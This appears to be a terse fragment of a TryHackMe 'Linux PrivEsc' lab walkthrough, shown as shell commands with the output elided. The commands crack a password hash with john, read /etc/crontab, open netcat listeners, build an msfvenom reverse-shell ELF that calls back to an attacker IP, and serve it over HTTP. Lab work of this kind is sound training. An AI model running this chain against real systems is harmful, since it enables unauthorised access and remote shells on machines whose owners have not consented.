...
```
bibo318@parrot:~/CTFs/tryhackme/Linux PrivEsc$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
...
```
bibo318@parrot:~/CTFs/tryhackme/Linux PrivEsc$ cat /etc/crontab
...
```
bibo318@parrot:~/CTFs/tryhackme/Linux PrivEsc$ nc -nvlp 9001
...
```
bibo318@parrot:~/CTFs/tryhackme/Linux PrivEsc$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.106.222 LPORT=9001 -f elf -o shell.elf
...
```
bibo318@parrot:~/CTFs/tryhackme/Linux PrivEsc$ sudo python3 -m http.server 80
...
```
bibo318@parrot:~/CTFs/tryhackme/Linux PrivEsc$ nc -nvlp 9001listening on [any] 9001 ...
